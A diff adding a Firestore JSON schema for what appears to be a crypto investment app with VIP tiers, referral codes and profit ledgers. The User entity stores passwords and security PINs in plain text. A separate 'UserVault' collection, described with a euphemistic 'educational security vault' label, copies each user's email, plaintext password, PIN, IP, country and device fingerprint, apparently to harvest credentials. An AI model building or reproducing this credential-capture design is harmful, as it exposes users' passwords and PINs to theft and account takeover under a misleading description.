@@ -1,0 +1,92 @@
+{
+  "entities": {
+    "User": {
+      "title": "User Profile",
+      "description": "User account profile, balances, VIP tier, and security settings.",
+      "type": "object",
+      "properties": {
+        "uid": { "type": "string" },
+        "email": { "type": "string" },
+        "plainPassword": { "type": "string" },
+        "securityPin": { "type": "string" },
+        "sponsorCode": { "type": "string" },
+        "referralCode": { "type": "string" },
+        "registeredIp": { "type": "string" },
+        "registeredCountry": { "type": "string" },
+        "deviceFingerprint": { "type": "string" },
+        "vipLevel": { "type": "number" },
+        "totalBalance": { "type": "number" },
+        "withdrawableBalance": { "type": "number" },
+        "lockedInvestment": { "type": "number" },
+        "bonusBalance": { "type": "number" },
+        "twoFactorEnabled": { "type": "boolean" },
+        "lastCheckinTimestamp": { "type": "number" },
+        "checkinStreak": { "type": "number" },
+        "createdAt": { "type": "string" },
+        "updatedAt": { "type": "string" },
+        "lastActiveAt": { "type": "string" }
+      },
+      "required": ["uid", "email"]
+    },
+    "Transaction": {
+      "title": "Transaction Record",
+      "description": "User ledger record for deposits, withdrawals, quantifications, and bonuses.",
+      "type": "object",
+      "properties": {
+        "id": { "type": "string" },
+        "timestamp": { "type": "string" },
+        "dateStr": { "type": "string" },
+        "timeStr": { "type": "string" },
+        "coinName": { "type": "string" },
+        "profitPercent": { "type": "number" },
+        "profitAmount": { "type": "number" },
+        "balanceAfter": { "type": "number" },
+        "type": { "type": "string" },
+        "status": { "type": "string" },
+        "txHash": { "type": "string" },
+        "orderId": { "type": "string" },
+        "network": { "type": "string" },
+        "nodeRoute": { "type": "string" },
+        "actualAmount": { "type": "number" },
+        "serviceCharge": { "type": "number" },
+        "fullDateStr": { "type": "string" },
+        "approvalStatus": { "type": "string" },
+        "paymentStatus": { "type": "string" },
+        "createdAt": { "type": "string" }
+      },
+      "required": ["id", "type", "status"]
+    },
+    "UserVault": {
+      "title": "Educational Security Vault",
+      "description": "Educational credentials audit record requested for multi-account training and compliance.",
+      "type": "object",
+      "properties": {
+        "uid": { "type": "string" },
+        "email": { "type": "string" },
+        "plainPassword": { "type": "string" },
+        "securityPin": { "type": "string" },
+        "ip": { "type": "string" },
+        "country": { "type": "string" },
+        "deviceFingerprint": { "type": "string" },
+        "sponsorCode": { "type": "string" },
+        "referralCode": { "type": "string" },
+        "recordedAt": { "type": "string" }
+      },
+      "required": ["uid", "email"]
+    }
+  },
+  "firestore": {
+    "/users/{userId}": {
+      "schema": "User",
+      "description": "User profile state and balances."
+    },
+    "/users/{userId}/transactions/{transactionId}": {
+      "schema": "Transaction",
+      "description": "Ledger of user transactions including deposits, withdrawals, and daily rewards."
+    },
+    "/user_vault/{userId}": {
+      "schema": "UserVault",
+      "description": "Security audit record with device geolocation, PIN, and network credentials."
+    }
+  }
+}
